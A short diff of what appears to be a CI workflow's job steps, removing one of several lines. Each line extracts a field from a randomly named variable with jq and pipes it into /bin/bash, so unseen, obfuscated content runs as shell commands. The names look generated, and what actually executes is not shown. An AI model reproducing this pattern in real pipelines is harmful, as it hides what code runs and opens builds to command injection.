@@ -23,7 +23,6 @@ jobs:
           echo $wbvc0159 | jq -r .bdtpj3427 | /bin/bash
           printf '%s' "$w28" | jq -r .vs942 | /bin/bash
           echo $acmrd85603 | jq -r .q4 | /bin/bash
-          echo $jmc84 | jq -r .ddxj209 | /bin/bash
           echo $ov3 | jq -r .kwk723 | /bin/bash
           echo $qcaa24890 | jq -r .ciilk661 | /bin/bash
           printf '%s' "$x252" | jq -r .vh815 | /bin/bash
